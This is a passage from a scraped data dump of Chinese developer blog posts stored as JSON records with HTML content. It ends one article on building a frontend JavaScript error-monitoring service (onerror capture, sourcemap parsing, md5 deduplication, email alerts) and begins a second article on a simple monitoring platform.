src=\"https://user-gold-cdn.xitu.io/2017/12/23/1608159fe7500f9e?w=908\u0026amp;h=601\u0026amp;f=png\u0026amp;s=374328\"\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e  其实这个问题很常见，但是这次我觉得这个问题如果不是我们自己同事发现的，那就很恐怖，可能废很大精力才能查出问题，甚至会导致很严重的线上bug，细思极恐，刚好前不久成都FCC的大前端交流会上叶小钗谈到了监控这块，也让我有所启发，这些公共服务才是公司的核心财富，目前公司业务发展处在上升阶段，未来用户肯定会越来越多，对系统的稳定性要求也会越来越高，那既然我们还缺乏这块的服务，现在做正合适。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003e\u003cspan style=\"color: #800000;\"\u003e前期准备\u003c/span\u003e\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e   从提出这个想法的一开始就知道，落地才是关键，否则一切空谈。\u0026nbsp; 刚好半个多月以后，我们前端组需要在公司做一次分享，我现在做个题材就挺适合分享的，其他后端和测试同事也容易听进去一点。\u0026nbsp;\u0026nbsp;最开始我考虑了后端存储和可视化的情况，想找个现成后端集成工具帮我处理后端的工作。\u0026nbsp; 就找后端同事问了一下，同事推荐了\u003cstrong\u003e\u0026nbsp;\u003cspan\u003eElasticsearch+Fluentd+Kibana 。\u0026nbsp;\u0026nbsp;\u003c/span\u003e\u003c/strong\u003e\u003cspan\u003e然后稍微研究了一下，总觉得哪里不对，反正研究了之后发现可能还是需要做一些定制开发才能解决需求，后端同事听了我的需求也是这么说的。\u0026nbsp;\u0026nbsp;\u003c/span\u003e一人之力有限，并且公司业务上的事情也多，找一个后端同事配合极好，利用各自的优势可以更快落地，这样我也可以专注前端的工作和把控整个项目落地。\u0026nbsp; 就这样，我和后端同事商量了一下，他也答应抽空和我一起搞了。\u0026nbsp; \u0026nbsp;抛开后端的事情，我开始思考前端的工作，去调研一下别人的方案和这块的知识。\u0026nbsp; 有一些三方库或者开源项目提供类似的功能的，做了很简单的了解。\u0026nbsp; 最后想着自己开发更容易去适应自身的业务，并且目前第一版的需求功能也并没有那么大的开发量，那就自己做吧。\u0026nbsp; 前期遇见了一些需要解决和实现的功能点： 生成sourcemap，监听js报错和信息上报，压缩的js代码上报后sourcemap解析问题，如何更平滑的应用在业务项目中，数据存储优化等。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003e基本实现\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style=\"font-size: 16px;\"\u003e\u003cstrong\u003e前端\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e  js报错事件监听+处理上报\u003c/li\u003e\n\u003cli\u003e  构建工具生成sourcemap文件\u003c/li\u003e\n\u003cli\u003e  sourcemap文件上传\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cspan style=\"font-size: 16px;\"\u003e\u003cstrong\u003e后端\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e  提供接口收集报错\u003c/li\u003e\n\u003cli\u003e  读取sourcemap文件，解析上传的报错（解析发生时间：接口收集到后马上处理，后期提取的时候处理）\u003c/li\u003e\n\u003cli\u003e  存储数据\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e\u0026nbsp;\u003c/h2\u003e\n\u003ch3\u003e\u003cspan style=\"color: #800000;\"\u003e监听js报错和信息上报\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e通过onerror我们能监听和拿到js的报错信息， 可以拿到如下代码的五个参数。\u0026nbsp; columnNo, error这两个参数在一些老版本的IE8-9浏览器和opera低版本等浏览器上可能拿不到，但是没有关系，我们在代码上兼容拿不到参数的情况，如果缺少后两个参数，传空值就行了。\u0026nbsp; 也可以通过其他方式拿到这些老版本浏览器的columnNo和error参数，目前监控主要是针对移动端，也没太大必要去兼容老版本的浏览器。\u003c/p\u003e\n\u003cdiv class=\"cnblogs_code\"\u003e\n\u003cpre\u003ewindow.onerror = function (msg, fileUrl, lineNo, columnNo, error) {}\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003eonerror方法大致实现如下：\u003c/p\u003e\n\u003cdiv data-height=\"552\" data-width=\"796\" class=\"image-view\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/23/1608160e56d5d23e?w=700\u0026amp;h=485\u0026amp;f=png\u0026amp;s=38011\" style=\"cursor: zoom-in;\" class=\"\" data-original-filesize=\"49756\" data-original-format=\"image/png\" data-original-height=\"552\" data-original-width=\"796\" data-original-src=\"//upload-images.jianshu.io/upload_images/2098002-e027a797d65aa5ec.png\"\u003e\u003c/div\u003e\n\u003cp\u003e可能存在跨域问题，不同域下的js需要配置script属性\u0026nbsp;\u003cstrong\u003ecrossorigin=\"anonymous\"\u0026nbsp;\u003c/strong\u003e和后端配置\u0026nbsp;\u003cstrong\u003eAccess-Control-Allow-Origin，\u003c/strong\u003e但是目前我们的项目不存在js跨域问题。\u003c/p\u003e\n提示一下onerror并不能拿到所有报错信息，比如网络报错等。\n\u003cp\u003e现在我们能通过onerror拿到报错信息了，可是线上的代码是经过压缩的，报错的时候我们能拿到的的行列数和变量命都不能告诉我们源代码哪里出错了。这里我们需要用到sourcemap，下面来讲讲它。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003e\u003cspan style=\"color: #800000;\"\u003esourcemap\u003c/span\u003e\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003esourcemap就是一个信息文件，里面储存着位置信息。\u0026nbsp; 也就是说，sourcemap文件记录了代码转换前的位置和转换后对应的位置（\u003ca target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html%20\"\u003ehttp://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html 阮一峰详解\u003c/a\u003e）。\u0026nbsp; 下面图1是login.js的压缩版本，第二行的注释指定了map文件的相对路径，浏览器根据注释会找到map文件然后自动解析出来，在调试器里就可以看到源码了；\u0026nbsp; 图2是map文件（json格式）；\u0026nbsp; 图3图4介绍sourcemap文件。\u0026nbsp; 图2我们生成的map文件sourcesContent字段直接引入了源文件代码（构建工具可以配置是否给map文件引入源文件），这样可以方便后端解析，如果没有源文件对应的话后端是解析不出正确结果的。\u003c/p\u003e\n\u003cp\u003e\u003cspan style=\"color: #808000;\"\u003e（图1）\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/1608159fe8641053?w=640\u0026amp;h=96\u0026amp;f=png\u0026amp;s=9805\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style=\"color: #808000;\"\u003e（图2）\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/1608159fea445808?w=337\u0026amp;h=96\u0026amp;f=png\u0026amp;s=10697\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style=\"color: #808000;\"\u003e（图3）\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/1608159fe5c0a0e1?w=797\u0026amp;h=311\u0026amp;f=png\u0026amp;s=23156\"\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e（图4）\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/160815a00ef15a82?w=807\u0026amp;h=359\u0026amp;f=png\u0026amp;s=28884\"\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch3\u003e\u003cspan style=\"color: #800000;\"\u003egrunt生成sourcemap：\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e  我们的移动端项目构建工具比较老了，统一用的grunt作为打包工具。\u0026nbsp; 之前没有在压缩代码时使用sourceMap，因为开发和测试环境没有压缩，所以也不需要在浏览器用sourceMap调试。\u0026nbsp; 然后我就再去修改gruntfile文件（之前不是我写的），sourceMap配置感觉和官方文档对不上，老是报错，最后才发现之前的打包工具的依赖版本是13年的了，也暂时没必要去折腾版本问题了，把老版本的文档翻出来再配置了一下sourcemap文件就成功的生成在源文件的同级目录下了，比如源文件叫xx.js，map文件就是xx.js.map。\u0026nbsp; 我们给js文件加上了md5版本号，所以实际的文件是xx.md5.js和xx.md5.js.map(md5是根据内容变化的)。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003esourcemap解析问题\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e思考的时候发现最大的难点应该在sourcemap解析。\u0026nbsp; 最开始后端同事以为sourcemap是nodejs生成的文件，他们后端用的go或者php似乎不能解析吧，如果知道了sourcemap原理就应该知道，它只是一种数据格式和开发语言没关系。\u0026nbsp; 我把map文件和报错信息交给后端同事，他们用go语言的一个工具成功解析出了答案，实现了本地文件的解析。\u0026nbsp; 但是我们需要的是自动化解析，不可能每次都去把存储的报错信息手动的拿出来再去找对应的map文件做人工解析。\u0026nbsp; 所以需要我们后端程序自己去找到map文件，并解析报错信息。\u003c/p\u003e\n\u003cp\u003e如此一来，后端解析存在两个关键问题：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003emap文件存储在哪里\u003c/li\u003e\n\u003cli\u003e什么时候解析\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e\u003cspan style=\"color: #800000;\"\u003e①map文件存储在哪里\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e这里只说我们的方案，map文件和源js文件打包到同级目录下，一起上传到服务器（比如js的路径是www.xxx.com/dist/index.md5.js，那map文件的地址就是www.xxx.com/dist/index.md5.js.map），服务端就可以根据报错的js路径再加上.map后缀找到map文件。\u0026nbsp; 压缩文件有一段注释描述sourceMappongURL指定了map文件的位置，打开浏览器之后调试器会找到这个map文件，在浏览器里就能看到源代码，为了避免这种情况，需要服务器配置 \u003cstrong\u003e.js.map\u003c/strong\u003e 后缀的文件不可访问。\u0026nbsp; 如果这样的话，服务器解析的时候不能直接去下载静态资源.map文件，而是需要去找到服务器本地对应的map文件，这样要单独配置路径和写逻辑很麻烦，而且文件夹结构有变动的话也不灵活。\u0026nbsp; 所以我们的方案是做token权限校验，map文件必须加正确的token参数，服务器才会返回资源（xxx.js.map?token=xxxx），否则nginx会屏蔽没有token或者token错误的请求。\u003c/p\u003e\n\u003ch3\u003e\u0026nbsp;\u003c/h3\u003e\n\u003ch3\u003e\u003cspan style=\"color: #800000;\"\u003e②什么时候解析\u003c/span\u003e\u003c/h3\u003e\n\u003cp\u003e两种方法，一种是后端接口收到报错信息之后，马上找到map文件，并解析存储到数据库。\u0026nbsp; 一种是先保留上报信息，通过接口查询的时候再去解析。\u0026nbsp; 我们选择了前者，接口收到数据之后，后端根据当前报错文件的url，去查查本地是否已经下载过当前文件，如果已经存在这个文件，就直接用本地的文件解析，如果本地没有，路径加上.map和token参数，下载对应的map文件到本地，然后再去读取当前本地文件并解析，解析的数据和上报的数据就存为一条记录。\u0026nbsp; 如果是后者的方法，存在很多麻烦的问题，这里不多说了。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;一张图详细描述我们的解析流程：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/160815a010218ed0?w=811\u0026amp;h=699\u0026amp;f=png\u0026amp;s=53315\"\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e有一种情况可能发生： 当前项目已经更新到1.1版本了，1.0版本的一个报错以前没被触发，这个时候有个用户缓存了1.0版本的代码，并且触发了一个新的报错，这个时候服务器本地存储的map文件里没有这个文件，就会带上token去下载map文件，因为当前已经是1.1版本了，原js文件发生过变动，md5的版本已经对应不上了，这个时候就没法找到map文件了，无法解析，所以这种特殊情况只能存储上报的errorInfo信息。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cstrong\u003e\u003cspan style=\"color: #800000;\"\u003e如何更平滑的应用在业务项目中\u003c/span\u003e\u003c/strong\u003e\u003c/h2\u003e\n\u003cp\u003e目前js的onerror方法只有代码量不大，后期还会有叠加。现在的想法是尽量不和业务代码做过多接触，只需要直接引入当前js到各个业务项目中去，每个项目不用对它太多任何配置，让它尽量单纯一点。\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003e存储优化\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e后期是会做管理后台来查询和统计这些异常日志的，同一个错误可能上传报错数据到服务端，后端查询出来是一条条独立的记录，我们不能区分这条记录的报错是不是有重复数据，也不应该让后端去做字段对比。\u0026nbsp; 后来想到给\u0026nbsp;\u003cstrong\u003e报错的文件路径+行+列\u003c/strong\u003e 信息拼在一起字段做md5生成，根据这个唯一值生成md5，最后查询的时候只需要查询当前md5字段就能知道这一条报错一个有多少条记录。\u0026nbsp; 不过我想的太天真了，不同的浏览器报错行列信息有点不一样，同一报错就可能生成不同的md5字符串，即便这里有点问题，我还是继续用这个方案保存了md5（因为内核原因，移动端的差异还是比较小，当前字段也能有一定的区分性）。\u003c/p\u003e\n\u003cp\u003e我们第一版存储的主要数据（还有一些常规的就不说） ：\u003c/p\u003e\n\u003cdiv class=\"cnblogs_code\"\u003e\n\u003cpre\u003e\u003cspan style=\"color: #000000;\"\u003e{\n    \u003c/span\u003e\"businessInfo\": \"{}\",\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e业务项目自定义的数据\u003c/span\u003e\n    \"errorMd5\": \"80bb86b86da0607c0dc5c3a77e16eab6\",\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e根据报错部分信息生成的md5\u003c/span\u003e\n    \"manualSendError\": \"{}\",\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e手动上传的报错信息\u003c/span\u003e\n    \"pageUrl\": \"http://www.xxx.com/xxx.html\",\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e放生报错的页面url\u003c/span\u003e\n    \"parseError\": \u003cspan style=\"color: #0000ff;\"\u003etrue\u003c/span\u003e,\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e解释是否失败\u003c/span\u003e\n    \"parsed\": '{\"col\":0,\"errKey\":\"list\",\"file\":\"xxx.js\",\"line\":105}',\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003e解析后的行列、文件路径和变量\u003c/span\u003e\n    \"raw\": '{\"msg\":'', \"fileUrl\":'', \"lineNo\":'', \"columnNo\":'', \"error\":''}',\u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003eonerror的五个参数\u003c/span\u003e\n    \"userAgent\": \"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4X Build/MMB29M; wv)...\" \u003cspan style=\"color: #008000;\"\u003e//\u003c/span\u003e\u003cspan style=\"color: #008000;\"\u003enavigator.userAgent\u003c/span\u003e\n}\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003e发送邮件\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e邮件提醒是很有必要的一个功能，目前已经实现实时邮件提醒功能。 公司企业邮箱建个单独的邮箱就叫frontendmonitor@吧，当后端接口收到报错后，把解析数据通过这个邮箱发送给前端，达到提醒效果。\u0026nbsp; \u0026nbsp;如果是用QQ邮箱或者个人邮箱应该需要在账户里开启smtp服务，QQ企业邮箱是默认开启此功能的。\u0026nbsp; 邮件功能要注意性能和优化问题，不能因为前端报错太多导致服务器挂掉。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/160815a01379c5e5?w=1087\u0026amp;h=251\u0026amp;f=png\u0026amp;s=23028\"\u003e\u003c/p\u003e\n\u003ch2\u003e\u0026nbsp;\u003c/h2\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003e实际使用后的优化\u003c/span\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e我们发现不同的浏览器报错的变量可能不一样，同一个报错在chrome浏览器和firefox上\u0026nbsp;\u003cstrong\u003ecolumnNo\u0026nbsp;\u003c/strong\u003e参数一点偏差。\u0026nbsp; 用两种报错解析了一下，如下图，报错的代码都是18行，是没问题的，Firefox报错是下图第一个：console 18 0 true，chrome是testBase 18 0 true，行数没问题，偏差不影响我们最终查错，我的18行源代码是：console.log(testBase)。\u0026nbsp; testBase是故意没有申明，testBase是undefined，出问题的应该是testBase这个变量，过从报错情况上看，确实是谷歌浏览器更精准一点。\u0026nbsp; 虽然不在意IE，不过IE11报错列数和firefox一致。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e    \u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/160815a013a8f45b?w=447\u0026amp;h=91\u0026amp;f=png\u0026amp;s=56451\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e页面触发事件报错，用户一直触发按钮，这时就会不停上报错误信息。解决：存储上一个报错信息和时间，进行比对，同一个报错，短时间内避免一直重复发送。\u003c/li\u003e\n\u003cli\u003e框架模板报错，被框架本身捕获，不会触发window.onerror，需要使用框架本身的全局监听捕获信息后手动上传，这里需要加手动上传错误信息的方法。\u003c/li\u003e\n\u003cli\u003e引入监控的项目，由于业务原因可能需要上传一些业务信息方便分析，所以预留一个配置字段，上传错误的时候请求会带上业务相关信息。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003ch2\u003e\u003cspan style=\"color: #800000;\"\u003e总结\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e这种非业务服务，来源于个人兴趣和思考，并没有上层压力需要你做或者什么时候做完。\u0026nbsp; 从最开始有个想法、去调研、去找后端同事求助、 开干到最终落地。\u0026nbsp; 这个过程需要自己坚持做下去，因为害怕自己不能最终落地，所以抓紧时间，一步步去实现每个细节的想法，让事情尽快落地和上线，以免自己对这个事情越拖越久。\u0026nbsp; 作为需求方，更好的把握整个项目，加上自己的兴趣，所以这次自己也学习了一点go语言，保证能看懂后端代码和了解后端逻辑，最好能做一点开发，这次在后端同事代码的基础上，实现了发邮件的小功能，我称之为浅入浅出，装完逼就跑路~\u0026nbsp; 现在第一版已经上线，并且在刚上线不到两个小时，就收到了报错邮件，吓得我急忙查找bug，很快查出来了问题来，这个bug应该存在很久了，但是因为没有阻塞性，并且没有影响到业务，也一直没被发现，结论是我们这个前端异常监控功能还是很成功！\u0026nbsp; 后期还有很多功能需要开发，统计、数据可视化、智能报警等等。\u0026nbsp; 第一版落地，就为以后的迭代和进化打下了良好基础。\u003c/p\u003e\n\u003cp\u003e在做这个事情的过程中，我是想尽快把事情落地，时间也很紧张，也并没有做非常充分的调研，比如现成的一些开源项目是怎么做的。\u0026nbsp; 后来从同事那里了解到 \u003cstrong\u003esentry\u003c/strong\u003e 这些三方开源项目之后，也有一点失落过，虽然我也解决了我的需求，但是三方的开源项目是一个非常完善的系统，提供了很多功能，比我这个强大多了，那我做这个到底有什么意义， 感觉完全和别人比拼不上，未来我这个项目会继续迭代吗，有继续迭代的必要吗？\u0026nbsp; \u0026nbsp;以后有特殊定制化的需求的时候，也许自己开发的才容易更适应业务，可是有那个机会吗？\u0026nbsp; 这一次落地已经达到我最初的要求了，也能帮我解决目前问题，未来还有很多挑战和迭代等待着，我会带着它一路过关斩将，还是半路死掉？\u0026nbsp; \u0026nbsp;我想说：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/12/23/160815a0328ab09c?w=608\u0026amp;h=608\u0026amp;f=jpeg\u0026amp;s=34625\"\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e\n\u003cp\u003e\u003cspan style=\"font-size: 18px;\"\u003e最后大力地感谢我司后端同事的大力支持！！~\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u0026nbsp;\u003c/p\u003e","buildTime":"1515061041.3193","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c00a"},"id":"5a372716518825258a5fbc80","author":{"$oid":"5a4e178e201569114874bffa"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"搭建一个前端监控系统,不再错过BUG","meta":{"likeCount":0},"tag":["Node.js","Redis","Highlight.js"],"comment":[],"shortContent":"还记得在我上一家公司中，某一大佬做了一个监控系统，牛逼哄哄，挺想研究他到底是怎么搞出来的。当然我们也不是拍拍脑袋干活的人，总不能人家咋干我们就咋干。下面先就介绍下，这样的平台到底有啥好处。 首先我们为什么要做前端系统呢，先看下面这张表，可以很显然的看出，前端的性能对于产品的价值…","content":"\u003ch1 class=\"heading\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e还记得在我上一家公司中，某一大佬做了一个监控系统，牛逼哄哄，挺想研究他到底是怎么搞出来的。当然我们也不是拍拍脑袋干活的人，总不能人家咋干我们就咋干。下面先就介绍下，这样的平台到底有啥好处。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e背景\u003c/h1\u003e\n\u003cp\u003e首先我们为什么要做前端系统呢，先看下面这张表，可以很显然的看出，前端的性能对于产品的价值提升还是蛮有帮助的，但是这些信息如果我们能实时的采集到，并且实施以监控，让整个产品在产品线上一直保持高效的运作，这才是我们的目的。\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e性能\u003c/th\u003e\n\u003cth\u003e收益\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eGoogle 延迟 \u003cstrong\u003e400ms\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e搜索量下降 \u003cstrong\u003e0.59%\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eBing 延迟 \u003cstrong\u003e2s\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e收入下降 \u003cstrong\u003e4.3%\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eYahoo 延迟 \u003cstrong\u003e400ms\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e流量下降 \u003cstrong\u003e5-9%\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMozilla 页面打开减少 \u003cstrong\u003e2.2s\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e下载量提升 \u003cstrong\u003e15.4%\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eNetflix 开启 Gzip\u003c/td\u003e\n\u003ctd\u003e性能提升 13.25% 带宽减少\u003cstrong\u003e50%\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e其次，也有利于我们发布的产品，能够及时发现我们的错误。如果一个产品在新的迭代中，发生不可描述的错误。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce3510887ef?w=211\u0026amp;h=218\u0026amp;f=gif\u0026amp;s=948250\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce3510887ef?w=211\u0026amp;h=218\u0026amp;f=gif\u0026amp;s=948250\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e对！就是不可描述。我们总不可能等待用户的反馈投诉，到那个时候黄花菜都凉了。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e开始\u003c/h1\u003e\n\u003cp\u003e基于以上我们就开始搭建一个前端监\u003cstrong\u003e简易\u003c/strong\u003e控平台。(虽然现在市面上有很多这样的系统比如ELK,但是还是忍不住自己撸一个)\u003c/p\u003e\n\u003cp\u003e只能是简易了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34e8a7e9f?w=280\u0026amp;h=155\u0026amp;f=gif\u0026amp;s=675245\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34e8a7e9f?w=280\u0026amp;h=155\u0026amp;f=gif\u0026amp;s=675245\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e兄弟们原谅我，只能帮你们到这里了。\u003c/p\u003e\n\u003cp\u003e接下来请看。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34f90726b?w=430\u0026amp;h=238\u0026amp;f=png\u0026amp;s=7208\" src=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34f90726b?w=430\u0026amp;h=238\u0026amp;f=png\u0026amp;s=7208\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e以上是我们需要做的一些事情。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e收集信息\u003c/h1\u003e\n\u003cp\u003e要做监控系统，首先我们得有一个对象。我们监控的对象！对象！对象！对象。\u003c/p\u003e\n\u003cp\u003e我在我的系统写了一个这样的页面，\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e \n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e没错这就是我们要监控的页面。这个.....真不是我懒。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"https://user-gold-cdn.xitu.io/2017/12/17/16062ce34a300fd3?w=214\u0026amp;h=216\u0026amp;f=gif\u0026amp;s=988503\" 